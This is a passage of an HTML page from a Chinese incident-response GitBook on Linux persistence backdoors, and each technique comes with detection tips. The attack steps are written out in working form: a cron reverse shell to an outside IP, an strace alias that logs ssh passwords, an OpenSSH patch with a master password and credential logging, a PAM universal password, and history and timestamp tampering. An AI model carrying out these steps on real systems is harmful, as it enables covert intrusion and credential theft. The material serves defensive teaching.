+#&#x5982;&#x679C;&#x4F60;&#x60F3;&#x4FEE;&#x6539;&#x6E90;&#x7AEF;&#x53E3;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;python&#x7684;struct&#x6807;&#x51C6;&#x5E93;&#x5B9E;&#x73B0;&#x3002;&#x5176;&#x4E2D;x00x00LF&#x662F;19526&#x7684;&#x5927;&#x7AEF;&#x5F62;&#x5F0F;&#xFF0C;&#x4FBF;&#x4E8E;&#x4F20;&#x8F93;&#x548C;&#x5904;&#x7406;&#x3002;
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,19526)
+&gt;&gt;&gt; print repr(buffer)
+&apos;\x00\x00LF&apos;
+&gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,13377)
+&gt;&gt;&gt; print buffer
+4A
+</code></pre><p><img src="image/privilege-5-5.png" alt=""></p>
+<p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;</p>
+<pre><code># ls -al /usr/sbin/sshd
+# cat /usr/sbin/sshd
+&#x53EF;&#x901A;&#x8FC7;&#x91CD;&#x88C5;ssh&#x670D;&#x52A1;&#x6062;&#x590D;&#x3002;
+</code></pre><p><strong>6&#x3001;strace&#x540E;&#x95E8;</strong></p>
+<p>&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x66FF;&#x6362;&#x52A8;&#x6001;&#x8DDF;&#x8E2A;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x548C;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x8BB0;&#x5F55;&#x7528;&#x6237;ssh&#x3001;su&#x3001;sudo&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>
+<pre><code>#vim /etc/bashrc
+alias ssh=&apos;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&apos;
+# source /root/.bashrc
+</code></pre><p><img src="image/privilege-5-5-1.png" alt=""></p>
+<p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;&#x4F7F;&#x7528;<code>alias</code>&#x5373;&#x53EF;&#x53D1;&#x73B0;&#x5F02;&#x5E38;&#x3002;</p>
+<p><img src="image/privilege-5-5-2.png" alt=""></p>
+<p><strong>7&#x3001;crontab&#x53CD;&#x5F39;shell</strong></p>
+<p>crontab&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x5468;&#x671F;&#x6027;&#x88AB;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x3002;&#x65B0;&#x5EFA;shell&#x811A;&#x672C;&#xFF0C;&#x5229;&#x7528;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x53CD;&#x5F39;&#x3002;</p>
+<p>a&#x3001;&#x521B;&#x5EFA;shell&#x811A;&#x672C;&#xFF0C;&#x4F8B;&#x5982;&#x5728;/etc/evil.sh</p>
+<pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1
+</code></pre><p><code>chmod +sx /etc/evil.sh</code></p>
+<p>b&#x3001;crontab -e &#x8BBE;&#x7F6E;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;</p>
+<pre><code>#&#x6BCF;&#x4E00;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;
+*/1 * * * * root /etc/evil.sh
+</code></pre><p>&#x91CD;&#x542F;crond&#x670D;&#x52A1;&#xFF0C;<code>service crond restart</code>&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x7528;nc&#x63A5;&#x6536;shell&#x3002;</p>
+<p><img src="image/privilege-5-6.png" alt=""></p>
+<p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;</p>
+<pre><code># &#x67E5;&#x770B;&#x53EF;&#x7591;&#x7684;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x5217;&#x8868;
+crontab -e
+</code></pre><p><strong>8&#x3001;openssh&#x540E;&#x95E8;</strong></p>
+<p>&#x5229;&#x7528;openssh&#x540E;&#x95E8;&#xFF0C;&#x8BBE;&#x7F6E;SSH&#x540E;&#x95E8;&#x5BC6;&#x7801;&#x53CA;root&#x5BC6;&#x7801;&#x8BB0;&#x5F55;&#x4F4D;&#x7F6E;&#xFF0C;&#x9690;&#x853D;&#x6027;&#x8F83;&#x5F3A;&#xFF0C;&#x4E0D;&#x6613;&#x88AB;&#x53D1;&#x73B0;&#x3002;</p>
+<pre><code>a&#x3001;&#x5907;&#x4EFD;SSH&#x914D;&#x7F6E;&#x6587;&#x4EF6;
+mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
+mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
+
+b&#x3001;&#x89E3;&#x538B;&#x5E76;&#x5B89;&#x88C5;&#x8865;&#x4E01;
+tar zxf openssh-5.9p1.tar.gz
+tar zxf openssh-5.9p1.tar.gz
+cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1
+cd openssh-5.9p1
+patch &lt; sshbd5.9p1.diff
+
+c&#x3001;&#x8BB0;&#x5F55;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x53CA;&#x5176;&#x5BC6;&#x7801;
+vi  includes.h
+    #define ILOG &quot;/tmp/1.txt&quot;             //&#x8BB0;&#x5F55;&#x767B;&#x5F55;&#x672C;&#x673A;&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;
+    #define OLOG &quot;/tmp/2.txt&quot;             //&#x8BB0;&#x5F55;&#x672C;&#x673A;&#x767B;&#x5F55;&#x8FDC;&#x7A0B;&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;
+    #define SECRETPW &quot;123456789&quot;          //&#x540E;&#x95E8;&#x7684;&#x5BC6;&#x7801;
+
+d&#x3001;&#x4FEE;&#x6539;&#x7248;&#x672C;&#x4FE1;&#x606F;
+vi version.h
+    #define SSH_VERSION &quot;&#x586B;&#x5165;&#x4E4B;&#x524D;&#x8BB0;&#x4E0B;&#x6765;&#x7684;&#x7248;&#x672C;&#x53F7;,&#x4F2A;&#x88C5;&#x539F;&#x7248;&#x672C;&quot;
+    #define SSH_PORTABLE &quot;&#x5C0F;&#x7248;&#x672C;&#x53F7;&quot;
+
+e&#x3001;&#x5B89;&#x88C5;&#x5E76;&#x7F16;&#x8BD1;
+./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+make clean
+make &amp;&amp; make install
+service sshd restart
+
+f&#x3001;&#x5BF9;&#x6BD4;&#x539F;&#x6765;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4F7F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E00;&#x81F4;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x65E5;&#x671F;&#x3002;
+
+touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config
+touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config
+
+g&#x3001;&#x6E05;&#x9664;&#x64CD;&#x4F5C;&#x8BB0;&#x5F55;
+export HISTFILE=/dev/null
+export HISTSIZE=0
+echo &gt;/root/.bash_history //&#x6E05;&#x7A7A;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;
+</code></pre><p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;&#x5229;&#x7528;strace&#x627E;&#x51FA;ssh&#x540E;&#x95E8;.</p>
+<pre><code># 1&#x3001;&#x83B7;&#x53D6;&#x53EF;&#x7591;&#x8FDB;&#x7A0B;PI
+ps aux | grep sshd
+# 2&#x3001;&#x8DDF;&#x8E2A;sshd PID
+strace -o aa -ff -p  PID
+# 3&#x3001;&#x67E5;&#x770B;&#x8BB0;&#x5F55;&#x5BC6;&#x7801;&#x6253;&#x5F00;&#x6587;&#x4EF6;
+grep open sshd* | grep -v -e No -e  null -e denied| grep  WR
+</code></pre><p><strong>9&#x3001;PAM&#x540E;&#x95E8;</strong></p>
+<p>PAM &#xFF08;Pluggable Authentication Modules &#xFF09;&#x662F;&#x7531;Sun&#x63D0;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#x3002;&#x5B83;&#x901A;&#x8FC7;&#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#x548C;&#x4E00;&#x5957;&#x7EDF;&#x4E00;&#x7684;API&#xFF0C;&#x5C06;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#x548C;&#x8BE5;&#x670D;&#x52A1;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x5206;&#x5F00;&#xFF0C;&#x4F7F;&#x5F97;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x53EF;&#x4EE5;&#x7075;&#x6D3B;&#x5730;&#x6839;&#x636E;&#x9700;&#x8981;&#x7ED9;&#x4E0D;&#x540C;&#x7684;&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x800C;&#x65E0;&#x9700;&#x66F4;&#x6539;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x4FBF;&#x4E8E;&#x5411;&#x7CFB;&#x7EDF;&#x4E2D;&#x6DFB;&#x52A0;&#x65B0;&#x7684;&#x8BA4;&#x8BC1;&#x624B;&#x6BB5;&#x3002;PAM&#x6700;&#x521D;&#x662F;&#x96C6;&#x6210;&#x5728;Solaris&#x4E2D;&#xFF0C;&#x76EE;&#x524D;&#x5DF2;&#x79FB;&#x690D;&#x5230;&#x5176;&#x5B83;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5982;Linux&#x3001;SunOS&#x3001;HP-UX 9.0&#x7B49;&#x3002;</p>
+<p>&#x5229;&#x7528;&#x65B9;&#x6CD5;:</p>
+<pre><code>1&#x3001;&#x83B7;&#x53D6;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x6240;&#x4F7F;&#x7528;&#x7684;PAM&#x7248;&#x672C;&#xFF0C;&#x4E0B;&#x8F7D;&#x5BF9;&#x5E94;&#x7248;&#x672C;&#x7684;pam&#x7248;&#x672C;
+2&#x3001;&#x89E3;&#x538B;&#x7F29;&#xFF0C;&#x4FEE;&#x6539;pam_unix_auth.c&#x6587;&#x4EF6;&#xFF0C;&#x6DFB;&#x52A0;&#x4E07;&#x80FD;&#x5BC6;&#x7801;
+3&#x3001;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;PAM
+4&#x3001;&#x7F16;&#x8BD1;&#x5B8C;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5728;&#xFF1A;modules/pam_unix/.libs/pam_unix.so&#xFF0C;&#x590D;&#x5236;&#x5230;/lib64/security&#x4E2D;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#xFF0C;&#x5373;&#x53EF;&#x4F7F;&#x7528;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x767B;&#x9646;&#xFF0C;&#x5E76;&#x5C06;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x8BB0;&#x5F55;&#x5230;&#x6587;&#x4EF6;&#x4E2D;&#x3002;
+</code></pre><p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;</p>
+<pre><code># 1&#x3001;&#x901A;&#x8FC7;Strace&#x8DDF;&#x8E2A;ssh
+ps axu | grep sshd
+strace -o aa -ff -p PID
+grep open aa* | grep -v -e No -e null -e denied| grep WR
+# 2&#x3001;&#x68C0;&#x67E5;pam_unix.so&#x7684;&#x4FEE;&#x6539;&#x65F6;&#x95F4;
+stat /lib/security/pam_unix.so      #32&#x4F4D;
+stat /lib64/security/pam_unix.so    #64&#x4F4D;
+</code></pre><p><strong>10&#x3001;rookit&#x540E;&#x95E8;</strong></p>
+<p>Mafix&#x662F;&#x4E00;&#x6B3E;&#x5E38;&#x7528;&#x7684;&#x8F7B;&#x91CF;&#x5E94;&#x7528;&#x7EA7;&#x522B;Rootkits&#xFF0C;&#x662F;&#x901A;&#x8FC7;&#x4F2A;&#x9020;ssh&#x534F;&#x8BAE;&#x6F0F;&#x6D1E;&#x5B9E;&#x73B0;&#x8FDC;&#x7A0B;&#x767B;&#x9646;&#x7684;&#x7279;&#x70B9;&#x662F;&#x914D;&#x7F6E;&#x7B80;&#x5355;&#x5E76;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x9A8C;&#x8BC1;&#x5BC6;&#x7801;&#x548C;&#x7AEF;&#x53E3;&#x53F7;&#x3002;</p>
+<p>&#x5229;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x4F7F;&#x7528;ssh &#x7528;&#x6237;@IP -P &#x914D;&#x7F6E;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5373;&#x53EF;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x3002;</p>
+<p>&#x8FDE;&#x63A5;&#x540E;&#x7684;&#x622A;&#x56FE;&#xFF1A;</p>
+<p><img src="image/privilege-5-7.png" alt=""></p>
+<p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;&#x67E5;&#x770B;&#x7AEF;&#x53E3;&#x662F;&#x5426;&#x5F02;&#x5E38;&#xFF0C;RPM check&#x67E5;&#x770B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x88AB;&#x66FF;&#x6362;&#x3002;</p>
+<p>&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;</p>
+<p>LINUX&#x7684;&#x4E24;&#x79CD;&#x540E;&#x95E8;&#x603B;&#x7ED3;(suid shell&#x4E0E;inetd)</p>
+<p><a href="https://www.cnblogs.com/milantgh/p/3601812.html" target="_blank">https://www.cnblogs.com/milantgh/p/3601812.html</a></p>
+<p>linux&#x540E;&#x95E8;&#x603B;&#x7ED3;</p>
+<p><a href="https://www.cnblogs.com/zaqzzz/p/12099463.html" target="_blank">https://www.cnblogs.com/zaqzzz/p/12099463.html</a></p>
+<p><a href="https://www.secpulse.com/archives/100484.html" target="_blank">https://www.secpulse.com/archives/100484.html</a></p>
+<p>linux&#x5404;&#x79CD;&#x4E00;&#x53E5;&#x8BDD;&#x53CD;&#x5F39;shell&#x603B;&#x7ED3;</p>
+<p><a href="https://yq.aliyun.com/articles/519250?type=2" target="_blank">https://yq.aliyun.com/articles/519250?type=2</a></p>
+<p>Linux OpenSSH&#x540E;&#x95E8;&#x7684;&#x6DFB;&#x52A0;&#x4E0E;&#x9632;&#x8303;</p>
+<p><a href="https://yq.aliyun.com/articles/69350" target="_blank">https://yq.aliyun.com/articles/69350</a></p>
+<p>Linux&#x540E;&#x95E8;&#x6574;&#x7406;&#x5408;&#x96C6;</p>
+<p><a href="https://www.cnblogs.com/maplered/p/9224617.html" target="_blank">https://www.cnblogs.com/maplered/p/9224617.html</a></p>
+<p><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html" target="_blank">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></p>
+<p>linux &#x540E;&#x95E8;</p>
+<p><a href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/" target="_blank">https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="第3篇：Linux权限维持--隐藏篇.html" class="navigation navigation-prev " aria-label="Previous page: 第3篇：Linux权限维持--隐藏篇">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="第5篇：Windows命令行文件下载方式汇总.html" class="navigation navigation-next " aria-label="Next page: 第5篇：Windows命令行文件下载方式汇总">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"第4篇：Linux权限维持--后门篇","level":"1.4.4","depth":2,"next":{"title":"第5篇：Windows命令行文件下载方式汇总","level":"1.4.5","depth":2,"path":"privilege/第5篇：Windows命令行文件下载方式汇总.md","ref":"privilege/第5篇：Windows命令行文件下载方式汇总.md","articles":[]},"previous":{"title":"第3篇：Linux权限维持--隐藏篇","level":"1.4.3","depth":2,"path":"privilege/第3篇：Linux权限维持--隐藏篇.md","ref":"privilege/第3篇：Linux权限维持--隐藏篇.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing","back-to-top-button","splitter","chapter-fold","github","github-buttons","sharing-plus","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"chapter-fold":{},"github":{"url":"https://github.com/Bypass007/"},"livereload":{},"splitter":{},"search":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"github-buttons":{"buttons":[{"user":"Bypass007","repo":"Emergency-Response-Notes","type":"star","size":"small","count":true}]},"sharing":{"qq":false,"all":["weibo","qq","qzone","douban","facebook","twitter","google"],"douban":false,"facebook":false,"weibo":true,"whatsapp":false,"line":false,"google":false,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"Bypass","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"应急响应实战笔记","links":{"sharing":{"all":null,"facebook":null,"google":null,"twitter":null,"weibo":null}},"gitbook":"*","description":"应急响应实战笔记,一个安全工程师的自我修养。","extension":null},"file":{"path":"privilege/第4篇：Linux权限维持--后门篇.md","mtime":"2020-06-13T13:41:45.427Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-06-13T18:17:20.376Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
